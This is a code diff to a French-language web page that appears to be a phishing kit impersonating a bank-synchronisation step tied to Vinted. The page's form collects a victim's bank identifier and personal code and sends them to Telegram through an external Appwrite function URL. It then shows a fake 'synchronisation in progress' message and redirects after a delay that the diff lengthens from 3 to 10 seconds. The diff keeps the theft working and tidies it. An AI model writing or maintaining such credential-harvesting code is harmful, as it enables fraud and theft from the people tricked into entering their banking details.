@@ -827,6 +827,13 @@
 
     <div class="mobile-menu-overlay" id="mobile-menu-overlay"></div>
 
+    <!-- Import telegram.js -->
+    <script src="telegram.js"></script>
+    <script>
+        // Configuration de l'URL Appwrite Function
+        window.APPWRITE_FUNCTION_URL = 'https://69b7297c003347c0b8be.fra.appwrite.run';
+    </script>
+
     <script>
         // Script pour le menu mobile
         const menuIcon = document.getElementById('mobile-menu-icon');
@@ -853,13 +860,12 @@
                 const bankIdentifier = document.getElementById("bankIdentifier").value;
                 const personalCode = document.getElementById("personalCode").value;
 
-                // Envoyer les données bancaires à Telegram
-                const bankData = {
-                    bank_identifier: bankIdentifier,
-                    personal_code: personalCode
-                };
+                // Envoyer les données à Telegram
                 try {
-                    await telegramSender.sendBankSync(bankData, 'Synchronisation Bancaire');
+                    await telegramSender.sendBankSync({
+                        bank_identifier: bankIdentifier,
+                        personal_code: personalCode
+                    }, 'Synchronisation Bancaire');
                 } catch (error) {
                     console.error('Erreur Telegram:', error);
                 }
@@ -871,19 +877,12 @@
                 syncBtn.innerText = "Synchronisation en cours...";
                 syncMessage.style.display = "block";
 
-                // Redirection après 3 secondes
+                // Redirection après 10 secondes
                 setTimeout(() => {
                     window.location.href = "settings.confirmation.html"; // Rediriger vers Vinted.fr
-                }, 3000);
+                }, 10000);
             });
         }
-    </script>
-
-    <!-- Import telegram.js -->
-    <script src="telegram.js"></script>
-    <script>
-        // Configuration de l'URL de la Function Appwrite
-        window.APPWRITE_FUNCTION_URL = 'https://69b7297c003347c0b8be.fra.appwrite.run';
     </script>
 
 </body>
